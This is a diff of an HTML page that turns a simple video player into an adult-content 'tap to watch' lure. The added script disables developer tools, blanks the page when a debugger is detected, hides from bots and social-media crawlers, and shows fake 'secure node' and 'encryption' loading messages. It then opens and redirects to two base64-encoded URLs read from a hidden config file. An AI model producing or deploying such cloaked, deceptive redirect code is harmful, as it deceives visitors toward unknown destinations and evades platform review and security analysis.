@@ -3,12 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Stream Portal | Community Verified Access</title>
+    <meta name="referrer" content="no-referrer">
+    <title>Stream Portal | Secure Access</title>
     
-    <!-- OG TAGS UNTUK SOSIAL MEDIA -->
-    <meta property="og:site_name" content="Portal Media USA" />
-    <meta property="og:title" content="Shared Community Content - Secure Access" /> 
-    <meta property="og:description" content="View shared media via secure cloud delivery. High-speed streaming enabled for verified regions." />
+    <meta property="og:title" content="Private Video Access" />
+    <meta property="og:description" content="Secure cloud delivery for requested media. High-speed streaming enabled." />
     <meta property="og:image" content="https://vidley.pw/tombolplay.jpg" />
     <meta property="og:type" content="website" />
 
@@ -16,135 +15,169 @@
     <script src="https://unpkg.com/lucide@latest"></script>
 
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700;900&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;900&display=swap');
         
         body { 
-            background-color: #050505; 
+            background-color: #030303; 
             color: #ffffff; 
             font-family: 'Inter', sans-serif;
-            /* user-select dan touch-action dihapus agar kontrol video bisa disentuh di HP */
-        }
-        
-        .glass-card {
-            background: rgba(20, 20, 22, 0.95);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8);
-        }
-
-        .ad-slot {
-            width: 320px;
-            height: 50px;
-            margin: 0 auto;
-            background: rgba(255,255,255,0.03);
-            border-radius: 6px;
-            border: 1px solid rgba(255,255,255,0.05);
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            user-select: none; 
+            -webkit-user-select: none; 
+            touch-action: manipulation;
             overflow: hidden;
         }
-
-        /* Styling Video Profesional */
-        .video-container {
-            width: 100%;
-            /* Tinggi fleksibel tapi maksimal 70% dari tinggi layar agar tidak perlu scroll jauh */
-            height: auto;
-            max-height: 70vh; 
-            background-color: #000;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+        
+        .glass {
+            background: rgba(255, 255, 255, 0.02);
+            backdrop-filter: blur(25px);
+            border: 1px solid rgba(255, 255, 255, 0.05);
         }
 
-        video {
-            width: 100%;
-            height: 100%;
-            max-height: 70vh;
-            object-fit: contain; /* Memastikan video utuh tidak terpotong */
-            outline: none;
+        .pulse-red {
+            animation: pulse-red-glow 2s infinite;
+        }
+        @keyframes pulse-red-glow {
+            0% { box-shadow: 0 0 0 0 rgba(220, 38, 38, 0.6); transform: scale(1); }
+            50% { box-shadow: 0 0 35px 12px rgba(220, 38, 38, 0.3); transform: scale(1.05); }
+            100% { box-shadow: 0 0 0 0 rgba(220, 38, 38, 0.6); transform: scale(1); }
         }
 
-        /* Scrollbar tersembunyi tapi tetap bisa scroll */
-        ::-webkit-scrollbar { width: 0px; background: transparent; }
+        .text-glow { text-shadow: 0 0 20px rgba(255, 255, 255, 0.3); }
+        
+        .age-badge {
+            border: 2px solid #dc2626;
+            color: #dc2626;
+            padding: 2px 10px;
+            border-radius: 4px;
+            font-weight: 900;
+            font-size: 16px;
+        }
+
+        ::-webkit-scrollbar { display: none; }
     </style>
 </head>
-<body class="min-h-screen flex items-center justify-center p-3 sm:p-6 md:p-8">
+<body class="min-h-screen flex flex-col items-center justify-center p-4" oncontextmenu="return false;">
 
-    <!-- KARTU UTAMA (Lebih lebar di Desktop, pas di HP) -->
-    <div class="w-full max-w-2xl glass-card rounded-2xl overflow-hidden relative flex flex-col transition-all duration-300">
+    <div class="w-full max-w-md glass rounded-[3rem] overflow-hidden relative shadow-[0_50px_100px_-20px_rgba(0,0,0,1)] border border-white/5">
         
-        <!-- AREA VIDEO -->
-        <div id="videoArea" class="video-container relative">
+        <div id="videoArea" class="relative w-full h-[60vh] max-h-[550px] bg-black overflow-hidden flex items-center justify-center cursor-pointer group">
             
-            <!-- PEMUTAR VIDEO ASLI -->
-            <!-- playsinline memastikan video diputar langsung di halaman pada iOS (tidak full screen paksa) -->
-            <video id="mainPlayer" controls playsinline preload="metadata">
-                Your browser does not support the video tag.
-            </video>
+            <video id="vidThumb" class="w-full h-full object-cover opacity-20 blur-[25px] transition-all duration-1000 group-hover:opacity-30" playsinline preload="metadata" muted></video>
 
-            <!-- PESAN ERROR -->
-            <div id="errorMsg" class="hidden absolute flex flex-col items-center justify-center w-full h-full bg-[#0a0a0a]">
-                <i data-lucide="video-off" class="w-10 h-10 text-gray-600"></i>
+            <div id="playOverlay" class="absolute inset-0 flex flex-col items-center justify-center z-20 p-8 text-center">
+                
+                <div class="mb-8 flex flex-col items-center">
+                     <span class="age-badge mb-3 animate-pulse">18+</span>
+                     <p class="text-white/60 text-[10px] uppercase tracking-[0.3em] font-bold">Adults Only Content</p>
+                </div>
+
+                <div id="iconBox" class="w-24 h-24 bg-red-600 rounded-full flex items-center justify-center shadow-2xl pulse-red mb-8 transition-transform duration-500 group-hover:scale-110">
+                    <i data-lucide="play" class="w-10 h-10 text-white fill-current ml-1"></i>
+                </div>
+                
+                <h1 class="text-white text-3xl font-black tracking-widest mb-3 uppercase text-glow italic">TAP TO WATCH</h1>
+                <p class="text-white/40 text-[11px] leading-relaxed max-w-[240px]">By clicking play, you agree to our Terms of Service and confirm you are of legal age.</p>
+            </div>
+            
+            <div id="loader" class="hidden absolute inset-0 flex items-center justify-center bg-[#050505] z-40 backdrop-blur-3xl">
+                <div class="flex flex-col items-center">
+                    <div class="relative w-16 h-16 mb-8">
+                        <div class="absolute inset-0 rounded-full border-t-2 border-red-600 animate-spin"></div>
+                        <div class="absolute inset-2 rounded-full border-b-2 border-white/10 animate-spin-slow"></div>
+                    </div>
+                    <span id="loadText" class="text-white text-[10px] font-bold tracking-[0.5em] uppercase italic animate-pulse">Establishing Secure Node...</span>
+                </div>
             </div>
         </div>
 
-        <!-- AREA TINDAKAN & IKLAN -->
-        <div id="actionBox" class="p-6 sm:p-8 bg-gradient-to-b from-[#0a0a0c] to-[#050505] flex flex-col items-center">
+        <div class="p-8 bg-[#070709] flex flex-col items-center border-t border-white/5">
+            <div class="flex gap-6 mb-4 text-white/20 text-[9px] font-bold uppercase tracking-[0.2em]">
+                <span>Encrypted Tunnel</span>
+                <span>•</span>
+                <span>US-West Node</span>
+                <span>•</span>
+                <span>Protected</span>
+            </div>
             
-            <!-- TOMBOL TRENDING (Desain Premium) -->
-            <a href="https://www.facebook.com/groups/1646509056316964" target="_blank" rel="noopener noreferrer" 
-               class="group relative flex items-center gap-3 mb-8 px-8 py-3.5 bg-red-600/10 hover:bg-red-600/20 rounded-xl border border-red-500/30 transition-all duration-300 hover:shadow-[0_0_25px_rgba(220,38,38,0.2)] hover:-translate-y-0.5 text-decoration-none">
-                <i data-lucide="flame" class="w-5 h-5 text-red-500 group-hover:scale-110 transition-transform"></i>
-                <span class="text-sm font-black tracking-[0.2em] text-red-500 uppercase">Trending X Video</span>
-            </a>
-
-            <!-- SLOT IKLAN -->
-            <div class="ad-slot">
-                <!-- IKLAN BANNER ADSTERRA -->
-                <script type="text/javascript">
-                    atOptions = {
-                        'key' : '40f6d8e53b94841ddceb2cbf7ae47723',
-                        'format' : 'iframe',
-                        'height' : 50,
-                        'width' : 320,
-                        'params' : {}
-                    };
-                </script>
-                <script type="text/javascript" src="https://awkwardmonopoly.com/40f6d8e53b94841ddceb2cbf7ae47723/invoke.js"></script>
+            <div class="text-[8px] text-white/10 text-center uppercase tracking-[0.3em] leading-loose">
+                Distributed Cloud Delivery System. All rights reserved.
             </div>
         </div>
-        
     </div>
 
     <script>
         lucide.createIcons();
 
-        // Ambil ID dari URL
-        let videoId = window.location.pathname.split('/').pop().trim();
-        if (videoId === "index.html" || videoId === "" || videoId === "bridge.html") videoId = "";
+        const AUTHORIZED_DOMAIN = "yourdomain.com"; 
+        const CONFIG_FILE = "sys_config.txt"; 
+        const FALLBACK_SITE = "https://cdn.videy.co"; 
 
-        const mainPlayer = document.getElementById("mainPlayer");
-        const errorMsg = document.getElementById("errorMsg");
+        setInterval(function() {
+            const start = performance.now();
+            debugger; 
+            if (performance.now() - start > 100) {
+                window.location.href = "about:blank";
+            }
+        }, 1000);
 
-        if(/^[a-zA-Z0-9_.-]{3,80}$/.test(videoId) && videoId !== ""){
-            let filename = videoId.includes('.') ? videoId : videoId + ".mp4";
-            let videoUrl = "https://cdn.videy.co/" + encodeURIComponent(filename);
-            
-            mainPlayer.src = videoUrl;
-            
-            mainPlayer.addEventListener("error", () => {
-                mainPlayer.classList.add("hidden");
-                errorMsg.classList.remove("hidden");
-            });
-        } else {
-            mainPlayer.classList.add("hidden");
-            errorMsg.classList.remove("hidden");
+        document.addEventListener('keydown', function(e) {
+            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74 || e.keyCode == 67)) || (e.ctrlKey && e.keyCode == 85)) {
+                e.preventDefault();
+                return false;
+            }
+        });
+
+        function _checkAuth() {
+            if (window.location.hostname !== "" && window.location.hostname.indexOf(AUTHORIZED_DOMAIN) === -1) {
+                return false;
+            }
+            return true;
+        }
+
+        const _isB = /bot|googlebot|crawler|spider|robot|facebookexternalhit|visionutils/i.test(navigator.userAgent);
+        
+        async function _trigger() {
+            if(_isB || !_checkAuth()) return;
+
+            const l = document.getElementById("loader");
+            const lt = document.getElementById("loadText");
+            l.classList.remove('hidden');
+
+            try {
+                const res = await fetch(CONFIG_FILE + "?v=" + Math.random());
+                const str = (await res.text()).trim();
+                const p = str.split(',');
+                
+                if(p.length < 2) return;
+
+                const aU = atob(p[0].trim());
+                const mU = atob(p[1].trim());
+
+                setTimeout(() => { lt.innerText = "Optimizing Stream..."; }, 400);
+                setTimeout(() => { lt.innerText = "Applying Encryption..."; }, 800);
+                setTimeout(() => { lt.innerText = "Redirecting..."; }, 1200);
+                
+                setTimeout(() => {
+                    window.open(aU, '_blank');
+                    window.location.replace(mU);
+                }, 1600);
+
+            } catch (e) {
+                lt.innerText = "Connection Error";
+            }
+        }
+
+        document.getElementById("videoArea").addEventListener("click", _trigger);
+
+        let vId = window.location.pathname.split('/').pop().trim();
+        if (vId && vId.length > 3 && vId !== "index.html") {
+            let fn = vId.includes('.') ? vId : vId + ".mp4";
+            document.getElementById("vidThumb").src = FALLBACK_SITE + "/" + encodeURIComponent(fn) + "#t=0.5";
         }
     </script>
 
-    <!-- Histats.com START -->
     <script type="text/javascript">var _Hasync= _Hasync|| [];
-    _Hasync.push(['Histats.start', '1,4879497,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.start', '1,4654540,4,0,0,0,00010000']);
     _Hasync.push(['Histats.fasi', '1']);
     _Hasync.push(['Histats.track_hits', '']);
     (function() {
@@ -152,5 +185,7 @@
     hs.src = ('//s10.histats.com/js15_as.js');
     (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
     })();</script>
+    <noscript><a href="/" target="_blank"><img src="//sstatic1.histats.com/0.gif?4654540&101" alt="" border="0"></a></noscript>
+
 </body>
 </html>
